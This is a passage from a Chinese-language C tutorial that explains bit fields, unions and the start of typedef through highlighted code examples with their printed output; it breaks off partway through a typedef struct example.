语言又提供了一种数据结构，称为”位域”或”位段”。</p><p>所谓”位域”是把一个字节中的二进位划分为几个不同的区域，并说明每个区域的位数。每个域有一个域名，允许在程序中按域名进行操作。这样就可以把几个不同的对象用一个字节的二进制位域来表示。</p><p>典型的实例：</p><ul><li>用 1 位二进位存放一个开关量时，只有 0 和 1 两种状态。</li><li>读取外部文件格式——可以读取非标准的文件格式。例如：9 位的整数。</li></ul><h4 id="位域的定义和位域变量的说明"><a href="#位域的定义和位域变量的说明" class="headerlink" title="位域的定义和位域变量的说明"></a>位域的定义和位域变量的说明</h4><p>位域定义与结构定义相仿，其形式为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> 位域结构名 </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"></span><br><span class="line"> 位域列表</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中位域列表的形式为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">类型说明符 位域名: 位域长度</span><br></pre></td></tr></table></figure><p>例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bs</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> a:<span class="number">8</span>;</span><br><span class="line">    <span class="keyword">int</span> b:<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> c:<span class="number">6</span>;</span><br><span class="line">&#125;data;</span><br></pre></td></tr></table></figure><p>说明 data 为 bs 变量，共占两个字节。其中位域 a 占 8 位，位域 b 占 2 位，位域 c 占 6 位。</p><p>让我们再来看一个实例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">packed_struct</span> &#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> f1:<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> f2:<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> f3:<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> f4:<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> type:<span class="number">4</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> my_int:<span class="number">9</span>;</span><br><span class="line">&#125; pack;</span><br></pre></td></tr></table></figure><p>在这里，packed_struct 包含了 6 个成员：四个 1 位的标识符 f1..f4、一个 4 位的 type 和一个 9 位的 my_int。</p><p><strong>对于位域的定义尚有以下几点说明：</strong></p><ul><li>一个位域存储在同一个字节中，如一个字节所剩空间不够存放另一位域时，则会从下一单元起存放该位域。也可以有意使某位域从下一单元开始。例如：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bs</span>&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> a:<span class="number">4</span>;</span><br><span class="line">    <span class="keyword">unsigned</span>  :<span class="number">4</span>;    <span class="comment">/* 空域 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> b:<span class="number">4</span>;    <span class="comment">/* 从下一单元开始存放 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> c:<span class="number">4</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>在这个位域定义中，a 占第一字节的 4 位，后 4 位填 0 表示不使用，b 从第二字节开始，占用 4 位，c 占用 4 位。</li><li>由于位域不允许跨两个字节，因此位域的长度不能大于一个字节的长度，也就是说不能超过8位二进位。如果最大长度大于计算机的整数字长，一些编译器可能会允许域的内存重叠，另外一些编译器可能会把大于一个域的部分存储在下一个字中。</li><li>位域可以是无名位域，这时它只用来作填充或调整位置。无名的位域是不能使用的。例如：</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">k</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> a:<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span>  :<span class="number">2</span>;    <span class="comment">/* 该 2 位不能使用 */</span></span><br><span class="line">    <span class="keyword">int</span> b:<span class="number">3</span>;</span><br><span class="line">    <span class="keyword">int</span> c:<span class="number">2</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>从以上分析可以看出，位域在本质上就是一种结构类型，不过其成员是按二进位分配的。</p><h3 id="位域的使用"><a href="#位域的使用" class="headerlink" title="位域的使用"></a>位域的使用</h3><p>位域的使用和结构成员的使用相同，其一般形式为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">位域变量名.位域名</span><br><span class="line">位域变量名-&gt;位域名</span><br></pre></td></tr></table></figure><p>位域允许用各种格式输出。</p><p>请看下面的实例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">main()&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bs</span>&#123;</span></span><br><span class="line">        <span class="keyword">unsigned</span> a:<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">unsigned</span> b:<span class="number">3</span>;</span><br><span class="line">        <span class="keyword">unsigned</span> c:<span class="number">4</span>;</span><br><span class="line">    &#125; <span class="built_in">bit</span>,*pbit;</span><br><span class="line">    <span class="built_in">bit</span>.a=<span class="number">1</span>;    <span class="comment">/* 给位域赋值（应注意赋值不能超过该位域的允许范围） */</span></span><br><span class="line">    <span class="built_in">bit</span>.b=<span class="number">7</span>;    <span class="comment">/* 给位域赋值（应注意赋值不能超过该位域的允许范围） */</span></span><br><span class="line">    <span class="built_in">bit</span>.c=<span class="number">15</span>;    <span class="comment">/* 给位域赋值（应注意赋值不能超过该位域的允许范围） */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d,%d,%d\n"</span>,<span class="built_in">bit</span>.a,<span class="built_in">bit</span>.b,<span class="built_in">bit</span>.c);    <span class="comment">/* 以整型量格式输出三个域的内容 */</span></span><br><span class="line">    pbit=&amp;<span class="built_in">bit</span>;    <span class="comment">/* 把位域变量 bit 的地址送给指针变量 pbit */</span></span><br><span class="line">    pbit-&gt;a=<span class="number">0</span>;    <span class="comment">/* 用指针方式给位域 a 重新赋值，赋为 0 */</span></span><br><span class="line">    pbit-&gt;b&amp;=<span class="number">3</span>;    <span class="comment">/* 使用了复合的位运算符 "&amp;="，相当于：pbit-&gt;b=pbit-&gt;b&amp;3，位域 b 中原有值为 7，与 3 作按位与运算的结果为 3（111&amp;011=011，十进制值为 3） */</span></span><br><span class="line">    pbit-&gt;c|=<span class="number">1</span>;    <span class="comment">/* 使用了复合位运算符"|="，相当于：pbit-&gt;c=pbit-&gt;c|1，其结果为 15 */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d,%d,%d\n"</span>,pbit-&gt;a,pbit-&gt;b,pbit-&gt;c);    <span class="comment">/* 用指针方式输出了这三个域的值 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 上例程序中定义了位域结构 bs，三个位域为 a、b、c。说明了 bs 类型的变量 bit 和指向 bs 类型的指针变量 pbit。这表示位域也是可以使用指针的。 </p><h2 id="C-共用体"><a href="#C-共用体" class="headerlink" title="C    共用体"></a>C    共用体</h2><p> <strong>共用体</strong>是一种特殊的数据类型，允许您在相同的内存位置存储不同的数据类型。您可以定义一个带有多成员的共用体，但是任何时候只能有一个成员带有值。共用体提供了一种使用相同的内存位置的有效方式。 </p><h3 id="定义共用体"><a href="#定义共用体" class="headerlink" title="定义共用体"></a>定义共用体</h3><p>为了定义共用体，您必须使用 <strong>union</strong> 语句，方式与定义结构类似。union 语句定义了一个新的数据类型，带有多个成员。union 语句的格式如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> [<span class="keyword">union</span> tag]</span><br><span class="line">&#123;</span><br><span class="line">   member definition;</span><br><span class="line">   member definition;</span><br><span class="line">   ...</span><br><span class="line">   member definition;</span><br><span class="line">&#125; [one <span class="keyword">or</span> more <span class="keyword">union</span> variables];</span><br></pre></td></tr></table></figure><p> <strong>union tag</strong> 是可选的，每个 member definition 是标准的变量定义，比如 int i; 或者 float f; 或者其他有效的变量定义。在共用体定义的末尾，最后一个分号之前，您可以指定一个或多个共用体变量，这是可选的。下面定义一个名为 Data 的共用体类型，有三个成员 i、f 和 str： </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> Data</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">int</span> i;</span><br><span class="line">   <span class="keyword">float</span> f;</span><br><span class="line">   <span class="keyword">char</span>  str[<span class="number">20</span>];</span><br><span class="line">&#125; data;</span><br></pre></td></tr></table></figure><p>现在，<strong>Data</strong> 类型的变量可以存储一个整数、一个浮点数，或者一个字符串。这意味着一个变量（相同的内存位置）可以存储多个多种类型的数据。您可以根据需要在一个共用体内使用任何内置的或者用户自定义的数据类型。</p><p>共用体占用的内存应足够存储共用体中最大的成员。例如，在上面的实例中，Data 将占用 20 个字节的内存空间，因为在各个成员中，字符串所占用的空间是最大的。下面的实例将显示上面的共用体占用的总内存大小：</p><p><strong>实例</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">union</span> Data</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">int</span> i;</span><br><span class="line">   <span class="keyword">float</span> f;</span><br><span class="line">   <span class="keyword">char</span>  str[<span class="number">20</span>];</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">union</span> Data data;        </span><br><span class="line"> </span><br><span class="line">   <span class="built_in">printf</span>( <span class="string">"Memory size occupied by data : %d\n"</span>, <span class="keyword">sizeof</span>(data));</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当上面的代码被编译和执行时，它会产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Memory <span class="built_in">size</span> occupied by data : <span class="number">20</span></span><br></pre></td></tr></table></figure><h3 id="访问共用体成员"><a href="#访问共用体成员" class="headerlink" title="访问共用体成员"></a>访问共用体成员</h3><p> 为了访问共用体的成员，我们使用<strong>成员访问运算符（.）</strong>。成员访问运算符是共用体变量名称和我们要访问的共用体成员之间的一个句号。您可以使用 <strong>union</strong> 关键字来定义共用体类型的变量。下面的实例演示了共用体的用法： </p><p><strong>实例</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">union</span> Data</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">int</span> i;</span><br><span class="line">   <span class="keyword">float</span> f;</span><br><span class="line">   <span class="keyword">char</span>  str[<span class="number">20</span>];</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">union</span> Data data;        </span><br><span class="line"> </span><br><span class="line">   data.i = <span class="number">10</span>;</span><br><span class="line">   data.f = <span class="number">220.5</span>;</span><br><span class="line">   <span class="built_in">strcpy</span>( data.str, <span class="string">"C Programming"</span>);</span><br><span class="line"> </span><br><span class="line">   <span class="built_in">printf</span>( <span class="string">"data.i : %d\n"</span>, data.i);</span><br><span class="line">   <span class="built_in">printf</span>( <span class="string">"data.f : %f\n"</span>, data.f);</span><br><span class="line">   <span class="built_in">printf</span>( <span class="string">"data.str : %s\n"</span>, data.str);</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当上面的代码被编译和执行时，它会产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data.i : <span class="number">1917853763</span></span><br><span class="line">data.f : <span class="number">4122360580327794860452759994368.000000</span></span><br><span class="line">data.str : C Programming</span><br></pre></td></tr></table></figure><p> 在这里，我们可以看到共用体的 <strong>i</strong> 和 <strong>f</strong> 成员的值有损坏，因为最后赋给变量的值占用了内存位置，这也是 <strong>str</strong> 成员能够完好输出的原因。现在让我们再来看一个相同的实例，这次我们在同一时间只使用一个变量，这也演示了使用共用体的主要目的： </p><p><strong>实例</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">union</span> Data</span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">int</span> i;</span><br><span class="line">   <span class="keyword">float</span> f;</span><br><span class="line">   <span class="keyword">char</span>  str[<span class="number">20</span>];</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">union</span> Data data;        </span><br><span class="line"> </span><br><span class="line">   data.i = <span class="number">10</span>;</span><br><span class="line">   <span class="built_in">printf</span>( <span class="string">"data.i : %d\n"</span>, data.i);</span><br><span class="line">   </span><br><span class="line">   data.f = <span class="number">220.5</span>;</span><br><span class="line">   <span class="built_in">printf</span>( <span class="string">"data.f : %f\n"</span>, data.f);</span><br><span class="line">   </span><br><span class="line">   <span class="built_in">strcpy</span>( data.str, <span class="string">"C Programming"</span>);</span><br><span class="line">   <span class="built_in">printf</span>( <span class="string">"data.str : %s\n"</span>, data.str);</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当上面的代码被编译和执行时，它会产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">data.i : <span class="number">10</span></span><br><span class="line">data.f : <span class="number">220.500000</span></span><br><span class="line">data.str : C Programming</span><br></pre></td></tr></table></figure><p> 在这里，所有的成员都能完好输出，因为同一时间只用到一个成员。 </p><h2 id="C-位域"><a href="#C-位域" class="headerlink" title="C    位域"></a>C    位域</h2><p> 如果程序的结构中包含多个开关量，只有 TRUE/FALSE 变量，如下： </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> widthValidated;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> heightValidated;</span><br><span class="line">&#125; status;</span><br></pre></td></tr></table></figure><p> 这种结构需要 8 字节的内存空间，但在实际上，在每个变量中，我们只存储 0 或 1。在这种情况下，C 语言提供了一种更好的利用内存空间的方式。如果您在结构内使用这样的变量，您可以定义变量的宽度来告诉编译器，您将只使用这些字节。例如，上面的结构可以重写成： </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> widthValidated : <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> heightValidated : <span class="number">1</span>;</span><br><span class="line">&#125; status;</span><br></pre></td></tr></table></figure><p> 现在，上面的结构中，status 变量将占用 4 个字节的内存空间，但是只有 2 位被用来存储值。如果您用了 32 个变量，每一个变量宽度为 1 位，那么 status 结构将使用 4 个字节，但只要您再多用一个变量，如果使用了 33 个变量，那么它将分配内存的下一段来存储第 33 个变量，这个时候就开始使用 8 个字节。让我们看看下面的实例来理解这个概念： </p><p><strong>实例</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="comment">/* 定义简单的结构 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> widthValidated;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> heightValidated;</span><br><span class="line">&#125; status1;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/* 定义位域结构 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> widthValidated : <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> heightValidated : <span class="number">1</span>;</span><br><span class="line">&#125; status2;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>( <span class="string">"Memory size occupied by status1 : %d\n"</span>, <span class="keyword">sizeof</span>(status1));</span><br><span class="line">   <span class="built_in">printf</span>( <span class="string">"Memory size occupied by status2 : %d\n"</span>, <span class="keyword">sizeof</span>(status2));</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当上面的代码被编译和执行时，它会产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Memory <span class="built_in">size</span> occupied by status1 : <span class="number">8</span></span><br><span class="line">Memory <span class="built_in">size</span> occupied by status2 : <span class="number">4</span></span><br></pre></td></tr></table></figure><h3 id="位域声明"><a href="#位域声明" class="headerlink" title="位域声明"></a>位域声明</h3><p>在结构内声明位域的形式如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  type [member_name] : <span class="built_in">width</span> ;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>下面是有关位域中变量元素的描述：</p><table><thead><tr><th align="left">元素</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">type</td><td align="left">整数类型，决定了如何解释位域的值。类型可以是整型、有符号整型、无符号整型。</td></tr><tr><td align="left">member_name</td><td align="left">位域的名称。</td></tr><tr><td align="left">width</td><td align="left">位域中位的数量。宽度必须小于或等于指定类型的位宽度。</td></tr></tbody></table><p> 带有预定义宽度的变量被称为<strong>位域</strong>。位域可以存储多于 1 位的数，例如，需要一个变量来存储从 0 到 7 的值，您可以定义一个宽度为 3 位的位域，如下： </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> age : <span class="number">3</span>;</span><br><span class="line">&#125; Age;</span><br></pre></td></tr></table></figure><p>上面的结构定义指示 C 编译器，age 变量将只使用 3 位来存储这个值，如果您试图使用超过 3 位，则无法完成。让我们来看下面的实例：</p><p><strong>实例</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> age : <span class="number">3</span>;</span><br><span class="line">&#125; Age;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   Age.age = <span class="number">4</span>;</span><br><span class="line">   <span class="built_in">printf</span>( <span class="string">"Sizeof( Age ) : %d\n"</span>, <span class="keyword">sizeof</span>(Age) );</span><br><span class="line">   <span class="built_in">printf</span>( <span class="string">"Age.age : %d\n"</span>, Age.age );</span><br><span class="line"> </span><br><span class="line">   Age.age = <span class="number">7</span>;</span><br><span class="line">   <span class="built_in">printf</span>( <span class="string">"Age.age : %d\n"</span>, Age.age );</span><br><span class="line"> </span><br><span class="line">   Age.age = <span class="number">8</span>; <span class="comment">// 二进制表示为 1000 有四位，超出</span></span><br><span class="line">   <span class="built_in">printf</span>( <span class="string">"Age.age : %d\n"</span>, Age.age );</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当上面的代码被编译时，它会带有警告，当上面的代码被执行时，它会产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Sizeof( Age ) : <span class="number">4</span></span><br><span class="line">Age.age : <span class="number">4</span></span><br><span class="line">Age.age : <span class="number">7</span></span><br><span class="line">Age.age : <span class="number">0</span></span><br></pre></td></tr></table></figure><h2 id="C-typedef"><a href="#C-typedef" class="headerlink" title="C    typedef"></a>C    typedef</h2><p>​    C 语言提供了 <strong>typedef</strong> 关键字，您可以使用它来为类型取一个新的名字。下面的实例为单字节数字定义了一个术语 <strong>BYTE</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> BYTE;</span><br></pre></td></tr></table></figure><p>在这个类型定义之后，标识符 BYTE 可作为类型 <strong>unsigned char</strong> 的缩写，例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BYTE  b1, b2;</span><br></pre></td></tr></table></figure><p>按照惯例，定义时会大写字母，以便提醒用户类型名称是一个象征性的缩写，但您也可以使用小写字母，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> <span class="keyword">byte</span>;</span><br></pre></td></tr></table></figure><p>您也可以使用 <strong>typedef</strong> 来为用户自定义的数据类型取一个新的名字。例如，您可以对结构体使用 typedef 来定义一个新的数据类型名字，然后使用这个新的数据类型来直接定义结构变量，如下：</p><p><strong>实例</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Books</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">   <span class="keyword">char</span>  title[<span class="number">50</span>];</span><br><span class="line">   <span class="keyword">char</span>  author[<span class="number">50</span>];</span><br><span class="line">   <span class="keyword">char</span>  subject[<span 